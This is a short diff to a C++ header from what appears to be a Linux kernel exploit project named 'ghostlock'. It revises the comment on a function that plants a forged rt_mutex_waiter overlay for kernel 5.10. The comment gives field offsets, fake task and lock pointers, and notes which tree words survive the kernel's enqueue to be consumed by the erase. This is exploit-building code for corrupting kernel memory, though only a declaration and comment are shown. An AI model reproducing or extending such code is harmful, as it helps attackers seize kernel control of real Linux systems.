@@ -60,11 +60,12 @@ namespace ghostlock::memory {
         std::size_t task_offset, std::size_t lock_offset, std::uintptr_t fake_task,
         std::uintptr_t fake_lock) noexcept;
 
-    /* 5.10 multicast arm: additionally plants the compact rt_mutex_waiter
- * pi_tree_entry (0x18/0x20/0x28) and prio (0x40) words at waiter_offset, using
- * the same recipe the select_stack 5.10 word table writes. task/lock stay at
- * their profile offsets because the kernel overwrites them on enqueue; the PI
- * tree words are what survive and what the PI dequeue consumes. */
+    /* 5.10 multicast arm: plants the FULL compact rt_mutex_waiter overlay at
+ * waiter_offset — tree_entry (0x00/0x08/0x10), pi_tree_entry (0x18/0x20/0x28),
+ * task/lock at their profile offsets, prio (0x40) and deadline (0x48) — using
+ * the same recipe the select_stack 5.10 word table writes (marble-verified).
+ * task/lock stay at their profile offsets because the kernel overwrites them
+ * on enqueue; the tree words are what the erase consumes. */
     [[nodiscard]] bool encode_multicast_waiter_5_10(
         std::span<std::byte> buffer, std::size_t waiter_offset,
         std::size_t task_offset, std::size_t lock_offset,
